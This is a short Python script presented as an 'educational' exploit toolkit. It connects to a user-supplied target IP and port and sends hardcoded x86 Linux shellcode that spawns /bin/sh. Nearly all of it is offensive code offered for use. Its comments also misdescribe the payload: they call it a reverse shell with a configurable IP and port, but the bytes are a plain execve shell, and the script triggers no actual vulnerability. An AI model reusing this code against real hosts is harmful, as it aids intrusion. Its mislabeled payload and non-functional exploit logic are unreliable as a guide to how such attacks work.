# # lightsec-xploit: Custom Exploit Development Toolkit (Educational Use Only)

import socket
import sys
import time

def banner():
    print("""
   _      _       _     ____                      _       
  | |    (_)     | |   |  _ \                    | |      
  | |     _  __ _| |__ | |_) |_   _ ___  ___ __ _| |_ ___ 
  | |    | |/ _` | '_ \|  _ <| | | / __|/ __/ _` | __/ _ \
  | |____| | (_| | | | | |_) | |_| \__ \ (_| (_| | ||  __/
  |______|_|\__, |_| |_|____/ \__,_|___/\___\__,_|\__\___|
              __/ |         
             |___/      [ by 0xL1ght ]
    """)

def usage():
    print("Usage: python lightsec_xploit.py <target_ip> <target_port>")
    sys.exit(1)

def create_payload():
    # Simple reverse shell payload (for educational use only)
    # Change IP and PORT before testing in your lab
    payload = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    )
    return payload

def send_payload(ip, port):
    try:
        print(f"[*] Connecting to {ip}:{port}...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        print("[*] Connection established. Sending payload...")
        s.send(create_payload().encode('latin1'))
        print("[+] Payload sent.")
        s.close()
    except Exception as e:
        print(f"[!] Failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    banner()
    if len(sys.argv) != 3:
        usage()
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    send_payload(target_ip, target_port)